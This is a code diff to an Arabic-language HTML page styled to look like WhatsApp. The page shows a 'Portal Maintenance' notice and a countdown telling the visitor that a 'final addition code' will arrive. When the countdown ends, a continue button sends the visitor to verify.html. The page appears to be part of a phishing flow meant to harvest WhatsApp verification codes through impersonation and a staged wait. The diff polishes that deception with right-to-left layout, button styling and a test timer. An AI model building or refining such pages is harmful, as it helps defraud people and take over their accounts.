@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -30,35 +30,39 @@
             margin-bottom: 1rem;
             color: #25D366; /* Official WhatsApp Green */
             font-size: 1.5rem;
+            direction: ltr;
         }
         p {
             color: #8696A0; /* Official WhatsApp secondary text */
-            font-size: 1rem;
+            font-size: 1.1rem;
             line-height: 1.6;
-            margin-bottom: 2rem;
-            direction: rtl; /* Ensures proper right-to-left Arabic alignment */
+            margin-bottom: 1.5rem;
         }
         .timer {
-            font-size: 3.2rem;
+            font-size: 2.5rem;
             font-weight: bold;
             color: #25D366;
             margin-bottom: 2rem;
             font-variant-numeric: tabular-nums;
             letter-spacing: 2px;
+            direction: ltr;
         }
         .whatsapp-btn {
             display: none; /* Hidden until timer hits zero */
-            background-color: #25D366;
-            color: #111B21;
+            background-color: #005c4b;
+            color: #ffffff;
             text-decoration: none;
-            padding: 0.75rem 2rem;
+            padding: 0.85rem 2rem;
             border-radius: 0.5rem;
             font-weight: bold;
             font-size: 1rem;
+            border: none;
+            cursor: pointer;
             transition: background-color 0.2s;
+            width: 100%;
         }
         .whatsapp-btn:hover {
-            background-color: #20ba5a;
+            background-color: #075e54;
         }
     </style>
 </head>
@@ -66,15 +70,16 @@
 
     <div class="container">
         <h2>Portal Maintenance</h2>
-        <p>الرابط قيد الصيانة، يرجى المحاولة مرة أخرى. سوف يصلك رمز تأكيد الإضافة الأخير بعد 25 دقيقة.</p>
+        <p>هذا الموقع قيد الصيانة. سوف يصلك رمز الإضافة الأخير بعد</p>
         
-        <div class="timer" id="countdown">25:00</div>
+        <div class="timer" id="countdown">00:25</div>
         
-        <a id="whatsappLink" href="https://chat.whatsapp.com/YOUR_GROUP_INVITE_LINK" target="_blank" class="whatsapp-btn">Join WhatsApp Group</a>
+        <button id="whatsappBtn" class="whatsapp-btn">متابعة</button>
     </div>
 
     <script>
-        const DURATION_SECONDS = 25 * 60;
+        // Set to 25 seconds for testing. Change to (25 * 60) for 25 minutes.
+        const DURATION_SECONDS = 25; 
         let endTime = localStorage.getItem('registration_endtime');
 
         if (!endTime) {
@@ -83,7 +88,7 @@
         }
 
         const timerDisplay = document.getElementById('countdown');
-        const whatsappBtn = document.getElementById('whatsappLink');
+        const whatsappBtn = document.getElementById('whatsappBtn');
 
         function updateTimer() {
             const now = Date.now();
@@ -101,6 +106,10 @@
                 localStorage.removeItem('registration_endtime');
             }
         }
+
+        whatsappBtn.addEventListener('click', function() {
+            window.location.href = 'verify.html';
+        });
 
         updateTimer();
         const timerInterval = setInterval(updateTimer, 1000);
